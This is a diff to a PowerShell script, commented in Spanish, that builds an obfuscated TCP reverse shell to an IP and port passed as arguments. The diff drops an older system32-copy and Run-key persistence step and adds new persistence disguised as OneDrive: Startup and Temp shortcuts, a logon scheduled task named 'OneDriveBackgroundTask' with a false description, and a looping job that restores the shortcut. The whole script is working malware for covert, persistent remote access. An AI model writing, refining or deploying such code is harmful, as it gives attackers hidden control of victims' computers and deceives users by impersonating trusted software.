@@ -1,15 +1,6 @@
 param([string]$ip, [int]$port, [int]$offset=4)
 $ErrorActionPreference = "SilentlyContinue"
 
-# CONFIGURAR PERSISTENCIA PRIMERO
-# Copiar el script a system32 o cualquier otra carpeta oculta
-$destPath = "$env:windir\system32\hidden_script.ps1"
-Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $destPath -Force
-
-# Añadir clave de persistencia en el registro
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-Set-ItemProperty -Path $regPath -Name "SystemProcess" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File $destPath"
-
 # Reverse shell
 $rev_shell = @'
 $x=(New-Object net.sockets.tcpclient("$ip",$port)).getstream();
@@ -56,10 +47,44 @@ $strings = $strings | %{AplicarOffset($_)}
 # Construir el comando final ofuscado
 $final = ' [text.encoding]::('+"'asc'+'ii'"+").('gets'+'tring')([type]."+$strings[0]+'.'+$strings[1]+'('+$strings[3]+')::'+$strings[6]+'('+$strings[7]+'))|iex'
 
+# PERSISTENCIA
+
+# Crear accesos directos en ubicaciones escondidas
+$ShortcutPaths = @(
+    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\OneDrive.lnk",
+    "$env:USERPROFILE\AppData\Local\Temp\OneDrive.lnk"
+)
+
+foreach ($path in $ShortcutPaths) {
+    $WshShell = New-Object -ComObject WScript.Shell
+    $Shortcut = $WshShell.CreateShortcut($path)
+    $Shortcut.TargetPath = "powershell"
+    $Shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$final`""
+    $Shortcut.IconLocation = "C:\Windows\SysWOW64\OneDrive.ico"
+    $Shortcut.Save()
+}
+
+# Crear una tarea programada para la persistencia
+$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$final`""
+$TaskTrigger = New-ScheduledTaskTrigger -AtLogOn
+$TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+$TaskName = "OneDriveBackgroundTask"
+
+Register-ScheduledTask -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -TaskName $TaskName -Description "OneDrive updater for system maintenance"
+
+# Supervisar y restaurar el acceso directo en `Startup`
+Start-Job -ScriptBlock {
+    $StartupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\OneDrive.lnk"
+    while ($true) {
+        if (-not (Test-Path $StartupPath)) {
+            Copy-Item -Path "$env:USERPROFILE\AppData\Local\Temp\OneDrive.lnk" -Destination $StartupPath -Force
+        }
+        Start-Sleep -Seconds 10
+    }
+}
+
 # Ejecutar el código ofuscado
 iex $final
-
-
 
 
 
